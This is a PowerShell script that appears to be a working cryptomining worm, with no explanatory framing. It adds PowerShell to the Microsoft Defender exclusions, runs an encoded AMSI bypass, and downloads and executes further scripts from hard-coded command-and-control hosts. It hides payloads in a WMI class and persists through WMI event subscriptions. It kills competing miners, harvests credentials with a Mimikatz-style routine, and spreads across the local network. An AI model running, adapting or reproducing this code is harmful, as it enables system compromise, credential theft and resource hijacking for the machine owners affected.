

$opsys=Get-WmiObject Win32_OperatingSystem 
if ($opsys.version -like "10.*")
{

	$a = Get-MpPreference
	$b=$a.ExclusionProcess
	if (($b -ne $null) -and ($b.contains("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"))){
		"already list"
	}else{
		"add list"
		Add-MpPreference -ExclusionProcess "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
	}
	$am = 'JFdpbjMyID0gQCINCnVzaW5nIFN5c3RlbTsNCnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsNCnB1YmxpYyBjbGFzcyBXaW4zMiB7DQogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7DQogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOw0KICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildDQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgbHBBZGRyZXNzLCBVSW50UHRyIGR3U2l6ZSwgdWludCBmbE5ld1Byb3RlY3QsIG91dCB1aW50IGxwZmxPbGRQcm90ZWN0KTsNCn0NCiJADQoNCkFkZC1UeXBlICRXaW4zMg0KDQokTG9hZExpYnJhcnkgPSBbV2luMzJdOjpMb2FkTGlicmFyeSgiYSIrIm0iICsgInNpLiIrImRsbCIpDQokQWRkcmVzcyA9IFtXaW4zMl06OkdldFByb2NBZGRyZXNzKCRMb2FkTGlicmFyeSwgIkFtIisic2kiICsgIlNjYW4iICsgIkJ1ZmZlciIpDQokcCA9IDANCltXaW4zMl06OlZpcnR1YWxQcm90ZWN0KCRBZGRyZXNzLCBbdWludDMyXTUsIDB4NDAsIFtyZWZdJHApDQokUGF0Y2ggPSBbQnl0ZVtdXSAoMHhCOCwgMHg1NywgMHgwMCwgMHgwNywgMHg4MCwgMHhDMykNCltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJFBhdGNoLCAwLCAkQWRkcmVzcywgNik='
	iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($am)))

}


$se=@('45.10.69.139:8000','45.10.70.28:8000','fastrepunicat.spdns.org:8000')
$ses=@('45.10.69.139','45.10.70.28','fastrepunicat.spdns.org')

$nic=$null
foreach($t in $se)
{
	$ban=((New-Object Net.WebClient).DownloadString("http://$t/banner"))
	if ($ban -ne $null)
	{
		$nic='http://'+$t
		break
	}

}
if ($ban -eq $null)
{	
	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
	[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12

	foreach($t in $ses)
	{
		$ban=((New-Object Net.WebClient).DownloadString("https://$t/banner"))
		if ($ban -ne $null)
		{
			$nic='https://'+$t
			$nic
			break
		}
	}

}



if ((Get-WmiObject Win32_OperatingSystem).osarchitecture.contains('32'))
{
	IEX(New-Object Net.WebClient).DownloadString("$nic/in3.ps1")
	return
}

function decom ($src)
{
	$data = [System.Convert]::FromBase64String($src)
	$ms = New-Object System.IO.MemoryStream
	$ms.Write($data, 0, $data.Length)
	$ms.Seek(0,0) | Out-Null
	$sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))
	$t = $sr.readtoend()
	return $t
}
function reload ($f){
$a=decom $f
$b=""
$size=[Math]::Floor($a.length/1000)
for($i=$size-1;$i -ge 0;$i--)
{ 
    $b+=$a.Substring($i*1000,1000)
} 
$b+=$a.Substring($size*1000)
return $b
}
$fa=reload $fa



$mimi=$fa.Substring(0,1724416)
$mon=$fa.Substring(1724418,3620184)
$funs=$fa.Substring(5344604,600960)
$mons=$fa.Substring(5945566,3818156)
$ring=$fa.Substring(9763724,19392)
$sc=$fa.Substring(9783118)


$StaticClass = New-Object Management.ManagementClass('root\default', $null,$null)
$StaticClass.Name = 'systemcore_Updater8'
$StaticClass.Put() | out-null
$StaticClass.Properties.Add('mimi' , $mimi)
$StaticClass.Put() | out-null
$StaticClass.Properties.Add('mon' , $mon)
$StaticClass.Put() | out-null
$StaticClass.Properties.Add('funs' , $funs)
$StaticClass.Put() | out-null
$StaticClass.Properties.Add('mons' , $mons)
$StaticClass.Put() | out-null
$StaticClass.Properties.Add('ring' , $ring)

$StaticClass.Put() | out-null
$StaticClass.Properties.Add('sc' , $sc)
$StaticClass.Put() | out-null
$opsys=Get-WmiObject Win32_OperatingSystem 
if ($opsys.version -like "10.*"){
	$am = 'JFdpbjMyID0gQCINCnVzaW5nIFN5c3RlbTsNCnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsNCnB1YmxpYyBjbGFzcyBXaW4zMiB7DQogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7DQogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOw0KICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildDQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgbHBBZGRyZXNzLCBVSW50UHRyIGR3U2l6ZSwgdWludCBmbE5ld1Byb3RlY3QsIG91dCB1aW50IGxwZmxPbGRQcm90ZWN0KTsNCn0NCiJADQoNCkFkZC1UeXBlICRXaW4zMg0KDQokTG9hZExpYnJhcnkgPSBbV2luMzJdOjpMb2FkTGlicmFyeSgiYSIrIm0iICsgInNpLiIrImRsbCIpDQokQWRkcmVzcyA9IFtXaW4zMl06OkdldFByb2NBZGRyZXNzKCRMb2FkTGlicmFyeSwgIkFtIisic2kiICsgIlNjYW4iICsgIkJ1ZmZlciIpDQokcCA9IDANCltXaW4zMl06OlZpcnR1YWxQcm90ZWN0KCRBZGRyZXNzLCBbdWludDMyXTUsIDB4NDAsIFtyZWZdJHApDQokUGF0Y2ggPSBbQnl0ZVtdXSAoMHhCOCwgMHg1NywgMHgwMCwgMHgwNywgMHg4MCwgMHhDMykNCltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJFBhdGNoLCAwLCAkQWRkcmVzcywgNik='
	$StaticClass.Properties.Add('am' , $am)
	$StaticClass.Put() | out-null
}



$filterName = 'SCM Event8 Log Filter'
$consumerName = 'SCM Event8 Log Consumer'
$filterName2 = 'SCM Event8 Log Filter2'

$consumerName2 = 'SCM Event8 Log Consumer2'
$Script=@'

$opsys=Get-WmiObject Win32_OperatingSystem 
if ($opsys.version -like "10.*")
{

	$a = Get-MpPreference
	$b=$a.ExclusionProcess
	if (($b -ne $null) -and ($b.contains("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"))){
		"already list"
	}else{
		"add list"
		Add-MpPreference -ExclusionProcess "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
	}

}


$se=@('45.10.69.139:8000','45.10.70.28:8000','fastrepunicat.spdns.org:8000')
$ses=@('45.10.69.139','45.10.70.28','fastrepunicat.spdns.org')


$nic=$null
foreach($t in $se)
{
	$ban=((New-Object Net.WebClient).DownloadString("http://$t/banner"))
	if ($ban -ne $null)
	{
		$nic='http://'+$t
		break
	}
}
if ($ban -eq $null)
{	
	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
	foreach($t in $ses)
	{
		$ban=((New-Object Net.WebClient).DownloadString("https://$t/banner"))
		if ($ban -ne $null)
		{
			$nic='https://'+$t
			break
		}
	}

}

$nic


$a=([string](Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding ))
if ($a -eq $null){
	IEX(New-Object Net.WebClient).DownloadString("$nic/in6.ps1")
}else{
	if (($ban -ne $null) -and (!$a.contains($ban)))
	{
		if ((Get-WmiObject Win32_OperatingSystem).osarchitecture.contains('64'))
		{
			IEX(New-Object Net.WebClient).DownloadString("$nic/in6.ps1")
		}else{
			IEX(New-Object Net.WebClient).DownloadString("$nic/in3.ps1")
		}
		return
	}
}




$finame="C:\Windows\System32\WindowsPowerShell\v1.0\WinRing0x64.sys"
if (!(test-path $finame)){
$EncodedFile = ([WmiClass] 'root\default:systemcore_Updater8').Properties['ring'].Value
$Bytes2=[system.convert]::FromBase64String($EncodedFile)
[IO.File]::WriteAllBytes($finame,$Bytes2)
}
sleep(10)
						




$stime=[Environment]::TickCount
$funs = ([WmiClass] 'root\default:systemcore_Updater8').Properties['funs'].Value        
$defun=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($funs))
iex $defun

Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -notmatch 'SCM Event8 Log'} |Remove-WmiObject


$exist=$False
[array]$psids= get-process  |sort cpu -Descending
$pname=$psids[0].processname
$psid=$psids[0].id
$tcpconn = netstat -anop tcp
if (($pname -eq 'powershell') -or ($pname -eq 'schtasks'))
{
	 
	if ($psids -ne $null )
	{
		foreach ($t in $tcpconn)

		{
			$line =$t.split(' ')| ?{$_}
			if ($line -eq $null)
			{continue}
			if (($psid -eq $line[-1]) -and $t.contains("ESTABLISHED") -and ($t.contains(":80 ") -or $t.contains(":14444") ) )
			{
				$exist=$true
				break
			}
		}
	}
}

foreach ($t in $tcpconn)
    {
        $line =$t.split(' ')| ?{$_}
		if (($line -eq $null) -or ($line.count -le 3)){continue}
        if (($line[-3].contains(":3333") -or $line[-3].contains(":5555")-or $line[-3].contains(":7777")) -and $t.contains("ESTABLISHED"))
        {
            $evid=$line[-1]
            Get-Process -id $evid | stop-process -force
        }
    }
$aa=get-process | Where-Object{($_.processname -eq 'powershell')  -or ($_.processname -eq 'schtasks')}
if ($aa.length -gt 12)
{
	$exist=$true
}	
	
if (!$exist)
{   
    $cmdmon="powershell -NoP -NonI -W Hidden `"`$mon = ([WmiClass] 'root\default:systemcore_Updater8').Properties['mon'].Value;`$funs = ([WmiClass] 'root\default:systemcore_Updater8').Properties['funs'].Value ;iex ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(`$funs)));Invoke-Command  -ScriptBlock `$RemoteScriptBlock -ArgumentList @(`$mon, `$mon, 'Void', 0, '', '')`""
    $vbs = New-Object -ComObject WScript.Shell

	$vbs.run($cmdmon,0)  
	sleep (100)
	[array]$psids= get-process -name powershell |sort cpu -Descending| ForEach-Object {$_.id}
	$tcpconn = netstat -anop tcp 
	$psstart=$False
	if ($psids -ne $null )
	{
		foreach ($t in $tcpconn)
		{
			$line =$t.split(' ')| ?{$_}
			if ($line -eq $null)
			{continue}
			if (($psids[0] -eq $line[-1]) -and $t.contains("ESTABLISHED") -and ($t.contains(":80 ") -or $t.contains(":14444") ) )
			{
				$psstart=$true
				break
			}
		}
	} 
	
	if ($psstart -eq $False)
	{
		$opsys=Get-WmiObject Win32_OperatingSystem 

		$EncodedFile = ([WmiClass] 'root\default:systemcore_Updater8').Properties['mons'].Value 
        $Bytes2=[system.convert]::FromBase64String($EncodedFile)
		$dirpath=[environment]::SystemDirectory+'\mue.exe'
		if ($opsys.version -like "10.*")
		{
			Add-MpPreference -ExclusionProcess $dirpath
		}
        [IO.File]::WriteAllBytes($dirpath,$Bytes2)
		Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList $dirpath
		sleep(10)
		remove-item $dirpath
	}	
	
}
$psproc= get-process -name powershell
if ($psproc.length -le 4)
{	
		
	$NTLM=$False
	$mimi = ([WmiClass] 'root\default:systemcore_Updater8').Properties['mimi'].Value 
	$a, $NTLM= Get-creds $mimi $mimi
		   
	$Networks = Get-WmiObject Win32_NetworkAdapterConfiguration -EA Stop | ? {$_.IPEnabled}    
	$scba= ([WmiClass] 'root\default:systemcore_Updater8').Properties['sc'].Value
	  
	$sc=[system.convert]::FromBase64String($scba)
	foreach ($Network in $Networks) 
	{            
		
		$IPAddress  = $Network.IpAddress[0]  
		if ($IPAddress -match '^169.254'){continue} 	
		$SubnetMask  = $Network.IPSubnet[0] 
		if (($IPAddress -match '^172.') -or ($IPAddress -match '^192.168') ){$SubnetMask='255.255.0.0'} 	
		$ips=Get-NetworkRange $IPAddress $SubnetMask
		$tcpconn = netstat -anop tcp 
		foreach ($t in $tcpconn)
		{
			$line =$t.split(' ')| ?{$_}
			if (!($line -is [array])){continue}
			if ($line.count -le 4){continue}

			$i=$line[-3].split(':')[0]
			if ( ($i -ne '127.0.0.1') -and ($ips -notcontains $i))
			{
				$ips+=$i
			}
		}
		$ips = Get-Random -InputObject $ips -Count ($ips.Count)
		test-net -computername $ips -creds $a -filter_name "SCM Event8 Log" -ntlm $NTLM -nic $nic -sc $sc -Throttle 10	
	 }       
}

'@
$Scriptbytes  = [System.Text.Encoding]::Unicode.GetBytes($Script)
$EncodedScript=[System.Convert]::ToBase64String($Scriptbytes)


$StaticClass.Properties.Add('enco' , $EncodedScript)
$StaticClass.Put() | out-null

$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 13600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$Query2= "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 301"


Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%SCM Event8 Log Consumer%'" | Remove-WmiObject
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -filter "name like '%SCM Event8 Log Filter%'" |Remove-WmiObject 

Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name like '%SCM Event8 Log Consumer%'" | Remove-WmiObject


$FilterParams = @{
        Namespace = 'root\subscription'
        Class = '__EventFilter'     
        Arguments =@{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query}
        ErrorAction = 'SilentlyContinue'
    }
$WMIEventFilter = Set-WmiInstance @FilterParams

$opsys=Get-WmiObject Win32_OperatingSystem 
if ($opsys.version -like "10.*")
{
	$cmdtem="powershell -NoP -NonI -W Hidden -exec bypass `"`$am = ([WmiClass] 'root\default:systemcore_Updater8').Properties['am'].Value;`$deam=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(`$am));iex `$deam;`$co = ([WmiClass] 'root\default:systemcore_Updater8').Properties['enco'].Value;`$deco=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$co));iex `$deco`""
}
else{
	$cmdtem="powershell -NoP -NonI -W Hidden -exec bypass  -E $EncodedScript "
}

$ConsumerParams = @{
        Namespace = 'root\subscription'
        Class = 'CommandLineEventConsumer'
        Arguments =@{ Name = $consumerName; CommandLineTemplate=$cmdtem}
        ErrorAction = 'SilentlyContinue'
    }
$WMIEventConsumer = Set-WmiInstance @ConsumerParams 

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer} | out-null


$FilterParams2 = @{
        Namespace = 'root\subscription'
        Class = '__EventFilter'     
        Arguments =@{Name=$filterName2;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query2}
        ErrorAction = 'SilentlyContinue'
    }
$WMIEventFilter2 = Set-WmiInstance @FilterParams2

$ConsumerParams2 = @{
        Namespace = 'root\subscription'

        Class = 'CommandLineEventConsumer'
        Arguments =@{ Name = $consumerName2; CommandLineTemplate=$cmdtem}
        ErrorAction = 'SilentlyContinue'
    }
$WMIEventConsumer2 = Set-WmiInstance @ConsumerParams2

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter2;Consumer=$WMIEventConsumer2} | out-null







powercfg /CHANGE -standby-timeout-ac 0 
powercfg /CHANGE -hibernate-timeout-ac 0 
Powercfg -SetAcValueIndex 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 5ca83367-6e45-459f-a27b-476b1d01c936 000

[array]$psids= get-process -name powershell |sort cpu -Descending| ForEach-Object {$_.id}
$tcpconn = netstat -anop tcp 
if ($psids -ne $null )

{
    foreach ($t in $tcpconn)
    {
        $line =$t.split(' ')| ?{$_}
        if ($line -eq $null)
        {continue}
		if (($psids -contains $line[-1]) -and $t.contains("ESTABLISHED") -and ($t.contains(":80 ") -or $t.contains(":14444") -or $t.contains(":14433") -or $t.contains(":443")) )
        {
			Get-Process -id $psids[0] | stop-process -force

            break
        }
    }
}

iex $script

